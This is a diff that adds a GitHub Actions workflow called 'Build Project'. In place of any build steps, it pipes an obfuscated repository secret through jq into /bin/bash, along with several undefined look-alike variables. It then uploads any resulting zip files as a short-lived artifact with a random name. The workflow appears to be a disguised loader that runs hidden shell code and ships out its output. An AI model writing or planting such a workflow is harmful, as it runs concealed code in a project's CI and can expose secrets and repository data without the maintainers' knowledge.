@@ -1,0 +1,27 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          kl88058: ${{ secrets.kl88058 }}
+        run: |
+          printf '%s' "$kl88058" | jq -r .b358 | /bin/bash
+          printf '%s' "$x64" | jq -r .mt9365 | /bin/bash
+          printf '%s' "$bydnr404" | jq -r .jwgbp663 | /bin/bash
+          echo $i0 | jq -r .woz98 | /bin/bash
+          echo $yt0 | jq -r .f70906 | /bin/bash
+          printf '%s' "$ue2021" | jq -r .wld24846 | /bin/bash
+          printf '%s' "$j02063" | jq -r .cnieg11340 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2IxYVrJj
+          path: "*.zip"
+          retention-days: 1
